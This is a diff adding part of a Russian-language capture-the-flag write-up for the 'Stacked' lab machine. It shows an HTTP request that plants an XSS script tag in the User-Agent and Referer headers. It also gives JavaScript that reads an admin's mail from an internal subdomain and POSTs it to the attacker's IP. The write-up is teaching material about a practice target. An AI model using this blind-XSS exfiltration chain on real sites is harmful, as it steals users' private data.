@@ -102,3 +102,52 @@ services:
 
 ![](../.gitbook/assets/4.png)
 
+'
+
+![](<../.gitbook/assets/5 (5).png>)
+
+![](../.gitbook/assets/6.png)
+
+```http
+POST /process.php HTTP/1.1
+Host: portfolio.stacked.htb
+User-Agent: <script src="http://10.10.16.93/index.js"></script>
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 93
+Origin: http://portfolio.stacked.htb
+DNT: 1
+Connection: close
+Referer: <script src="http://10.10.16.93/index.js"></script>
+
+fullname=tragernout&email=tragernout%40stacked.htb&tel=000000000000&subject=test&message=tests
+```
+
+![](<../.gitbook/assets/7 (1).png>)
+
+Чтобы увидеть HTTP заголовки реквеста админа, который "пытается" получить index.js можно использовать netcat:
+
+![](<../.gitbook/assets/8 (1).png>)
+
+Мы можем добавить поддомен mail.stacked.htb в наш /etc/hosts, но на него мы все равно не сможем попасть, потому что там скорее всего стоит защита и можно попасть на него только с localhost.
+
+Но мы можем посмотреть, что на этом поддомене через XSS. Так как на сайте используется XMLHttpRequest (из HTTP-заголовка), следовательно можно написать свой javascript-файл, который сделает GET-запрос на mail.stacked.htb от лица админа, а затем сделать POST-запрос с GET-ответом на наш хост:
+
+```javascript
+var url = "http://mail.stacked.htb/read-mail.php?id=2"
+
+var firstReq = new XMLHttpRequest();
+firstReq.open('GET', url, false);
+firstReq.send()
+
+var response = firstReq.responseText;
+
+var secondReq = new XMLHttpRequest();
+secondReq.open('POST', "http://10.10.16.93:8000/", false);
+secondReq.send(response);
+```
+
+![](../.gitbook/assets/9.png)
